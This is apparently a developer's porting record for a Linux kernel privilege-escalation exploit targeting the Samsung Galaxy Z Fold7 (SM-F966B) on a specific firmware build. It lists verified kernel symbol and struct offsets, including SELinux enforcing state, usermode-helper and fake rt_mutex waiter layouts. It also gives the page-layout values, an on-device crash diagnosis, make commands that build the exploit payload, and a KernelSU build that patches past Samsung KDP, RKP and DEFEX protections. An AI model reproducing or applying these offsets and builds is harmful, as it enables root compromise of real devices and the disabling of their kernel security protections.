# SM-F966B (Galaxy Z Fold7) — F966BXXS8AZC2 port record

Device:  Samsung Galaxy Z Fold7 (SM-F966B / board "q7q" / "sun")
SoC:     Qualcomm Snapdragon 8 Gen 3 "for Galaxy" (SM8650, codename "Kera")
Build:   BP2A.250605.031.A3 / F966BXXS8AZC2 / F966BOXM8AZB6 (XSA)
Android: 16 (SDK 36)
Kernel:  Linux 6.6.57-android15-8-31566393-abogkiF966BXXS8AZC2-4k
        compiled 2026-03-06 with Clang 18 (PGO+BOLT+LTO+MLGO), LLD 18

Profile ID: `q7q-F966BXXS8AZC2`

## Firmware identity

```
model:             SM-F966B
region:            XSA
AP/PDA:            F966BXXS8AZC2
CSC:               F966BOXM8AZB6
CP:                F966BXXS8AZB6
display build:     BP2A.250605.031.A3.F966BXXS8AZC2
fingerprint:       samsung/q7qxxx/q7q:16/BP2A.250605.031.A3/F966BXXS8AZC2_OXM8AZB6:user/release-keys
kernel release:    6.6.57-android15-8-31566393-abogkiF966BXXS8AZC2-4k
```

The fingerprint was confirmed on-device via `getprop ro.build.fingerprint`.
The fota `SYSTEM/build.prop` reports `qssi_64` but the device reports `q7q` with
the `_OXM8AZB6` CSC suffix — the device value is authoritative.

## Kernel provenance

```
boot.img size:      101_122_048
boot.img SHA-256:   8A28857C4717DF39FB645D3B8EF94E2E75A5683D99BC865D8DF2735713BB4CBB
kernel size:          37_440_000
kernel SHA-256:      479C088FCA4CAA0DFC0F799F166E3E8470C46CBA167C709548CBB6D0A1217FDC
ARM64 Image:         text_offset=0x0  image_size=0x2610000  flags=0xa
KIMAGE_TEXT_BASE:    0xffffffc080000000
P0_PHYS_OFFSET:      0x80000000
P0_KERNEL_PHYS_LOAD: 0xa8000000   (delta = 0x28000000)
```

Recovered vmlinux.elf via `vmlinux-to-elf` (provided in zfold7-analysis/firmware).
Symbols extracted with NDK r29 `llvm-nm` → `vmlinux.nm` (109,919 symbols).
BTF extracted from raw Image at `[0x179e990, 0x1d7f99d)` (6,164,493 bytes).
Kernel config from embedded IKCONFIG: `CONFIG_MODULE_FORCE_LOAD=n`, `CONFIG_MODVERSIONS=y`,
`CONFIG_RANDOMIZE_BASE=y`, `CONFIG_UH=y`, `CONFIG_RKP=y`, `CONFIG_KDP=y`.

P0 physical load is **0xa8000000**, not the 0x80000000 DRAM-base convention.
Qualcomm devices use ABL/XBL and the GKI boot header carries `kernel_addr=0`
(bootloader chooses the address), so the load address cannot be inferred from
the Image header alone. It was confirmed on-device from the 2026-07-23 panic
dump: `pgdp=0xa9d8b000` (physical address of `swapper_pg_dir`) minus its image
offset `0x1d8b000` (vmlinux.nm `0xffffffc081d8b000` − `KIMAGE_TEXT_BASE`)
= `0xa8000000`. Corroborated by:

- ABL "Final RAM Partitions" log: `[0xa8000000,+0x10000000)` is available RAM;
  `[0x80000000,0x81960000)` is never added as available.
- DTB `reserved-memory`: `gunyah_hyp_region@80000000 [0x80000000,+0xe00000)` —
  the Gunyah hypervisor owns the first 14 MB, so a DRAM-base kernel load is
  impossible.
- pa3q targets (same platform family) use the same `0xa8000000` value.

## Key derived offsets

| Macro | Symbol/derivation | Value | Verified |
|---|---|---|---|
| `KIMAGE_TEXT_BASE` | `_text` (kallsyms) | `0xffffffc080000000` | llvm-nm |
| `P0_KERNEL_PHYS_LOAD` | pgdp − (swapper_pg_dir − _text) from panic dump | `0xa8000000` | on-device |
| `ASHMEM_MISC_FOPS_OFF` | ashmem_misc + offsetof(miscdevice,fops)=0x10 | `0x0232cd70` | BTF + llvm-nm |
| `SELINUX_ENFORCING_OFF` | selinux_state (enforcing @ +0) | `0x02406360` | llvm-nm |
| `SLIDE_TRACEFS_EVENT_ID` | __TRACE_LAST_TYPE(20) + event_index(89) | `109` | kernel source + llvm-nm + **on-device** |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | Return PC after `bl schedule` in worker_thread | `0x000dac80` | llvm-objdump |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | "nfnetlink_log" string in Image | `0x016a016e` | Image scan |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | nfulnl_logger instance | `0x021c2278` | llvm-nm |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | random_table entry[4].data ptr | `0x022ea158` | Image scan |
| `SLIDE_SYSCTL_BOOTID_OFF` | sysctl_bootid UUID storage | `0x024a83f8` | llvm-nm |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | call_usermodehelper_exec_work | `0x000d2394` | llvm-nm |
| `SYSTEM_UNBOUND_WQ_OFF` | system_unbound_wq | `0x021bae60` | llvm-nm |

## BTF-verified struct layouts

### struct file_operations (Linux 6.6 — standard upstream layout)

The 6.6 kernel includes `iopoll` (0x30) and `splice_eof` (0xc8) upstream. No
additional Samsung-specific shift is needed. All offsets match the standard 6.6
layout:

```
FOPS_IOCTL_OFF  = 0x48    FOPS_OPEN_OFF  = 0x68
FOPS_COMPAT_OFF = 0x50    FOPS_RELEASE_OFF = 0x78
FOPS_MMAP_OFF   = 0x58    FOPS_SPLICE_READ_OFF = 0xb8
                           FOPS_SHOW_FDINFO_OFF = 0xd8
```

### struct task_struct

All verified against raw BTF — match pa3q 6.6 kernel layout:

```
usage=0x40, prio=0x84, normal_prio=0x8c, sched_task_group=0x348
pi_lock=0x90c, pi_waiters=0x920, pi_top_task=0x930, pi_blocked_on=0x938
```

### struct rt_mutex_waiter (Linux 6.6 — rt_waiter_node wrapper)

The 6.6 kernel wraps `struct rb_node` inside `struct rt_waiter_node` (40 bytes
each: rb_node 24 + prio 4 + pad 4 + deadline 8). pi_tree moved from 0x18 (6.1)
to 0x28 (6.6). No standalone `prio`/`deadline` fields — priority comes from the
rt_waiter_node wrapper. `COMPACT_RT_MUTEX_WAITER` must NOT be set.

```
FAKE_WAITER_TREE_PRIO_OFF       = 0x18   (tree.prio)
FAKE_WAITER_TREE_DEADLINE_OFF   = 0x20   (tree.deadline)
FAKE_WAITER_PI_TREE_ENTRY_OFF   = 0x28   (pi_tree.rb)
FAKE_WAITER_PI_TREE_PRIO_OFF    = 0x40   (pi_tree.prio)
FAKE_WAITER_PI_TREE_DEADLINE_OFF = 0x48  (pi_tree.deadline)
FAKE_WAITER_TASK_OFF            = 0x50
FAKE_WAITER_LOCK_OFF            = 0x58
FAKE_WAITER_WAKE_STATE_OFF      = 0x60
FAKE_WAITER_WW_CTX_OFF          = 0x68
FAKE_WAITER_LAYOUT_SIZE         = 0x70
```

## Page layout offsets (device-tested)

These differ from pa3q (S25U). Copied from the CyberMeowfia q7q target which
was independently derived for this device:

```
LOCK_OFF     = 0x1350   (pa3q: 0x2210)
W0_OFF       = 0x2220   (pa3q: 0x2350)
FOPS_OFF     = 0x1000   (pa3q: 0x2000)
SCRATCH_OFF  = 0x3000
RIGHT_OFF    = 0x4440
LEFT_OFF     = 0x5550
FAKE_TASK_OFF = 0x3200
```

Using pa3q's values caused `wait_requeue_pi` to always time out (errno 110) —
the fake waiter structures were at wrong positions within the reclaimed page.

## On-device verification results

### Confirmed via ADB (unrooted)

| Check | Value | Status |
|---|---|---|
| `uname -r` | `6.6.57-android15-8-31566393-abogkiF966BXXS8AZC2-4k` | ✅ |
| `/proc/version` | Full string matches JSON | ✅ |
| `getprop ro.build.fingerprint` | `q7q` with `_OXM8AZB6` | ✅ |
| `getprop ro.build.display.id` | `BP2A.250605.031.A3.F966BXXS8AZC2` | ✅ |
| `getprop ro.build.version.sdk` | 36 | ✅ |
| `getprop ro.product.cpu.abi` | arm64-v8a | ✅ |
| Trace event ID | 109 | ✅ |

### Exploit behavior (build-verified, device-tested)

The exploit was run on-device with 24 attempts. Early attempts failed with
`wait_requeue_pi` timeouts (errno 110) due to wrong page layout offsets (pa3q
values). After correcting LOCK_OFF/W0_OFF/FOPS_OFF to CyberMeowfia q7q values,
the exploit consistently reaches the P0 oracle scan:

1. **mm_struct leak**: intermittent failures, retry loop handles this
2. **Kernel page prepare**: works when mm_struct leak succeeds
3. **Slide phase (pselect/futex-PI)**: works with corrected page layout offsets
4. **P0 gate**: gate marker write + verify through the reclaimed pipe buffers
   works (normal-RAM pages only)
5. **P0 oracle probe**: **was broken by the wrong `P0_KERNEL_PHYS_LOAD`**
   (see below); fixed by the 0xa8000000 anchor — pending re-test

Note: earlier "P0 physical write / boot_id corruption confirmed" entries in
this document were recorded while `P0_KERNEL_PHYS_LOAD` was still 0x80000000.
With that delta, all data-alias targets were off by 0x28000000 (landing in
reserved gaps at 0x82xxxxxx), so those confirmations could not have hit the
intended kernel objects and are withdrawn.

### Kernel crash — root cause (2026-07-23)

The device repeatedly kernel-panicked during the oracle scan (`eRR.p` "RWC"
29–32 at 01:17/01:27/01:42/02:01, identical signature each time):

```
Unable to handle kernel paging request at virtual address ffffff80001f0000
FSC = 0x06: level 2 translation fault   (pmd=0000000000000000)
pc: __arch_copy_to_user+0x180/0x238   lr: copyout+0x7c/0xdc
 _copy_to_iter → copy_page_to_iter → pipe_read+0x14c → vfs_read → ksys_read
x1 = 0xffffff80001f0000  (source: probe page physmap VA)
```

Root cause: `P0_KERNEL_PHYS_LOAD` was `0x80000000` (DRAM-base convention), so
the probe address `P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + 0x1f0000` resolved
to IPA `0x801f0000` — inside the Gunyah hypervisor region, which has no
linear-map alias (pmd=0). The pipe oracle's `read()` on the armed pipe
therefore faulted at EL1 and panicked the kernel on attempt 1 of every run,
before the slide fingerprint could complete. The crash dump independently
proved the true load address: `pgdp=0xa9d8b000` − swapper_pg_dir image offset
`0x1d8b000` = `0xa8000000`.

Fix: `P0_KERNEL_PHYS_LOAD = 0xa8000000` in `src/targets/q7q-F966BXXS8AZC2/
target.h`. The probe then reads IPA `0xa81f0000`, which is inside the
available, linear-mapped `[0xa8000000,+0x10000000)` region. No fingerprint
table regeneration is needed (rows are image-relative).

An earlier revision of this section attributed the same call trace to a
later attempt re-probing after root and "fixed" it with the
`/data/local/tmp/temp_su.sock` guard in `src/preload.c`. That diagnosis was
wrong — the crash happens on attempt 1 before root. The socket guard remains
as defense-in-depth but was never the fix.

## KernelSU module

Built against KernelSU v3.2.5 with the Samsung KDP/RKP/DEFEX patch applied
cleanly. Docker build with `ghcr.io/ylarod/ddk-min:android15-6.6`, vermagic set
to `6.6.57-android15-8-31566393-abogkiF966BXXS8AZC2-4k`.

| Check | Result |
|---|---|
| `check_symbol` vs DDK vmlinux | ✅ Passed |
| `check_symbol` vs q7q vmlinux.elf | ✅ Passed (0 missing symbols) |
| vermagic match | ✅ Exact |
| `__versions` size | 0 bytes (manual relocation) |
| `.symtab` / `.strtab` preserved | ✅ |
| 221 undefined symbols, all in target symbol table | ✅ |
| `ksud` embedded KO as `android15-6.6_kernelsu.ko` | ✅ |

Artifacts:
- `kernelsu/android15-6.6_kernelsu-q7q-F966BXXS8AZC2-kdp.ko` (327,528 bytes)
- `kernelsu/ksud-q7q-F966BXXS8AZC2-kdp` (4,761,608 bytes)

## Not yet verified (need on-device testing)

| Item | Risk | How to verify |
|---|---|---|
| `SLIDE_PSELECT_WORD_SHIFT = 0` | Low — all 6.6 targets use 0 | On-device fd_set overlap check per PORTING.md §5 |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` 64K-alignment | Low | Enable trace event, observe kworker callers |
| KernelSU late-load (KDP credential transition, RKP syscall table write, DEFEX allow) | Medium | `ksud late-load` on device after root |
| Remaining timing constants (KSNITCH_*, BANK_*, PSELECT_DELAY_*) | Low | Copied from pa3q (same SoC gen, same KMI) |
| Root helper stability (multiple su sessions) | Medium | Extended use after root |

## Files in this port

```
src/targets/q7q-F966BXXS8AZC2/
  target.h              — all offsets, BTF-verified
  p0_fingerprint.h      — 256-qword P0 fingerprint table
  provenance.md         — kernel hashes and firmware identity

artifacts/q7q-F966BXXS8AZC2/
  cve-2026-43499-app.so — release payload (104,128 bytes)

kernelsu/
  android15-6.6_kernelsu-q7q-F966BXXS8AZC2-kdp.ko  — standalone KO (328 KB)
  ksud-q7q-F966BXXS8AZC2-kdp                        — late-load binary (4.8 MB)

support/
  targets-v2.json       — q7q-F966BXXS8AZC2 entry

docs/
  SM-F966B-F966BXXS8AZC2.md  — this document
```

## Build commands

```sh
# Exploit (macOS — note: release target stat -c %s doesn't work, pad manually)
ANDROID_NDK_HOME=$HOME/Library/Android/sdk/ndk/29.0.14206865 \
make TARGET=q7q-F966BXXS8AZC2 \
  TARGET_CC="$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang" \
  all

# KernelSU KO (requires Docker)
docker run --rm --platform linux/amd64 \
  -v "$PWD/KernelSU:/workspace" \
  -w /workspace/kernel \
  ghcr.io/ylarod/ddk-min:android15-6.6 \
  bash -c '
    TARGET="6.6.57-android15-8-31566393-abogkiF966BXXS8AZC2-4k"
    echo "$TARGET" > /opt/ddk/kdir/android15-6.6/include/config/kernel.release
    echo "#define UTS_RELEASE \"$TARGET\"" > /opt/ddk/kdir/android15-6.6/include/generated/utsrelease.h
    CONFIG_KSU=m CONFIG_KSU_SAMSUNG_KDP=y CONFIG_KSU_SAMSUNG_RKP=y \
    CONFIG_KSU_SAMSUNG_DEFEX=y CC=clang make -j$(nproc)
    llvm-strip -d ./kernelsu.ko
  '

# ksud (requires Rust aarch64-linux-android target + NDK r29)
cd KernelSU/userspace
CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER="$NDK_BIN/aarch64-linux-android35-clang" \
CC_aarch64_linux_android="$NDK_BIN/aarch64-linux-android35-clang" \
AR_aarch64_linux_android="$NDK_BIN/llvm-ar" \
BINDGEN_EXTRA_CLANG_ARGS_aarch64_linux_android="--sysroot=$NDK/sysroot" \
cargo build --release --target aarch64-linux-android -p ksud
```
